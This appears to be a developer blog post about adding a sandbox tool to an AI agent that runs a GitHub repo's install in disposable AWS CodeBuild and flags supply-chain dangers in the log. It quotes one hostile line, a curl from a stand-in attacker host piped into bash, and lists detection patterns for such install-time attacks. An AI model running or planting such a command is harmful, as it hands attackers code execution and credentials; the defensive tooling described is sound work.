---
title: "Stop scanning. Run it: I gave my AI agent a disposable AWS sandbox to vet any GitHub repo"
published: false
description: "My agent judged a GitHub repo by reading it. I added one tool and now it runs the install in a disposable AWS CodeBuild sandbox and catches the postinstall a static scan misses."
tags: aws, ai, security, devops
canonical_url: https://sarvarnadaf.com/blog/repopilot-sandbox-tool
cover_image:
---

> This started as an AWS Builder Center weekend challenge: take an agent you already built, add one new tool, and show the before and after. Mine went from reading a repo to actually running it.

My agent could read a GitHub repo and tell you if it looked safe. That word, looked, was the problem. So I gave it one new tool, and it stopped guessing.

I had RepoPilot, a Strands agent on Amazon Bedrock that inspects a public repo and tells you whether it is safe to clone and run. Every tool it had read the repo from the outside. The README, the manifests, the file tree. Useful, but it is a book report. The dangerous part of a repo is not what you read. It is what runs the moment you type `npm install`.

So the one tool I added runs it. In a disposable AWS sandbox. And the difference is not subtle.

---

## The one `npm install` away from disaster

The scary moment with someone else's code is install time, not reading time. An npm `preinstall` or `postinstall` hook, a `pip` build step, a `Makefile` target: these execute automatically, with your shell's full environment, the second you install. By then the code already ran, with whatever your terminal can reach. Your AWS keys. Your SSH keys. Your session tokens.

Almost every tool that claims to help does static analysis. It reads the code without running it and guesses. That is exactly blind to the thing that makes install-time attacks work, a hook that only shows its hand when it executes. A reader cannot see a `postinstall` fire. A runner can.

---

## Before: the agent reads the repo

RepoPilot v1 had five tools, and all five were readers. Point it at `pallets/click` and it would pull the README and the manifest, see they agree, and say "looks safe, try `pip install .`". Point it at a repo whose `package.json` quietly carried a `postinstall` that piped a remote script into a shell, and it would say the same thing: "looks fine." Not because it was careless. Because the hook is invisible to anything that only reads.

That is an honest verdict about the text. It is not an honest verdict about what happens when you run it.

---

## After: the agent runs it in a disposable AWS sandbox

The new tool is a single Strands `@tool` called `run_in_sandbox`:

```python
@tool
def run_in_sandbox_tool(repo: str, clone_url: str, install_cmd: str) -> str:
    """Run the repo's install in a disposable AWS CodeBuild sandbox and report the REAL
    result: success or fail, the plain-language cause, and any supply-chain danger in the log."""
    sb = CodeBuildSandbox(os.environ["REPOPILOT_SANDBOX_PROJECT"])
    return json.dumps(sb.run(repo, clone_url, install_cmd).__dict__)
```

It clones the repo and runs its install inside an ephemeral AWS CodeBuild container, captures the real build log from CloudWatch, reports whether the install actually succeeded, and scans that real log for supply-chain danger: a remote script piped into a shell, an `eval` of a download, a download-then-chmod-then-run, a destructive `sudo`.

The container is thrown away after the run. The untrusted code executes in AWS, never on your laptop. That is the whole safety argument in one sentence: it presses the button in a box, so you do not press it on your machine.

Point it at that same sneaky repo and the agent comes back with something a scanner could never produce:

> Caught it. The install piped `curl -s https://evil.example.com/i.sh | bash` straight into a shell. That line is in the real build log.

Same agent. Same repo. One new tool. v1 is a confident guess. v2 is the truth, quoted from a log of code that actually ran.

---

## How the tool works

The agent reasons with Amazon Nova Pro on Bedrock through the Strands SDK. The tool is boring in the best way, which is what makes it reusable:

- `build_buildspec` writes the clone and install steps into a base64-encoded shell script inside the CodeBuild buildspec. I did that after a real run failed: a repo's install command had quotes in it and broke the YAML. Base64 makes any quoting safe, and the tests now cover exactly that case.
- `CodeBuildSandbox.run` calls `StartBuild`, polls until the build finishes, then pulls the log from CloudWatch.
- `scan_log_for_danger` matches the real executed log and returns each flag with a plain-English reason and the exact evidence line.
- `summarize_build` turns it into a small JSON result any agent framework can consume.
- If AWS is not configured, the tool returns an "unavailable" result and the agent falls back to its static tools, so it never dead-ends.

The service role is least-privilege: it can write CloudWatch Logs and nothing else, because the clone and install need no AWS permissions.

---

## Why it is reusable

`run_in_sandbox` is a drop-in Strands `@tool` with one environment variable and one setup script. Any agent that has to answer "is it safe to actually run this untrusted thing?" can use the same pattern: run it in a disposable CodeBuild container, read the real log, decide from evidence instead of appearance.

One AWS service and one env var, so setup is a single script that also creates the least-privilege role. An injectable AWS client, so the verdict logic is unit-tested with a fake CodeBuild and CloudWatch, no AWS needed, which is how nine tests run green offline. And a clean JSON result object, so the framework around it does not matter.

---

## Proof, and an honest take

Both paths were validated end to end against live AWS CodeBuild. The safe repo came back SUCCEEDED with no danger. The sneaky repo came back SUCCEEDED too, and the danger scan flagged `remote_pipe_to_shell` with the exact `curl | bash` line pulled from the real log.

I will be honest about the edges. The sandbox runs the install step, where install-time attacks fire and where most first-run failures happen, not the whole application. The danger scan is pattern-based over the log, so it catches the common, high-value classes, not every possible obfuscation. And CodeBuild has outbound network by default because installs need it; a stricter build would pin egress to an allow-list.

Running the code and reading the real log is a categorically better signal than reading a README and hoping.

---

## Try it

The live demo is a before and after toggle: flip v1 (reads it) and v2 (runs it) on a safe repo and a sneaky one, and watch the agent go from "looks fine" to "caught it." It is a static replay of real recorded runs, so it costs nothing to keep online.

{% embed https://github.com/simplynadaf/repopilot-sandbox-tool %}

Live demo: https://simplynadaf.github.io/repopilot-sandbox-tool/

Everyone scans the repo. RepoPilot runs it, in a disposable AWS box, so your laptop does not.

---

*Follow me for more on AWS architecture, DevOps, and AI Infrastructure:*
*[Portfolio](https://sarvarnadaf.com) | [LinkedIn](https://www.linkedin.com/in/sarvar04/) | [Dev.to](https://dev.to/sarvar_04) | [YouTube](https://www.youtube.com/@sarvar-nadaf) | [AWS Builder Center](https://builder.aws.com/community/@sarvar) | [X](https://x.com/SarvarN_04)*
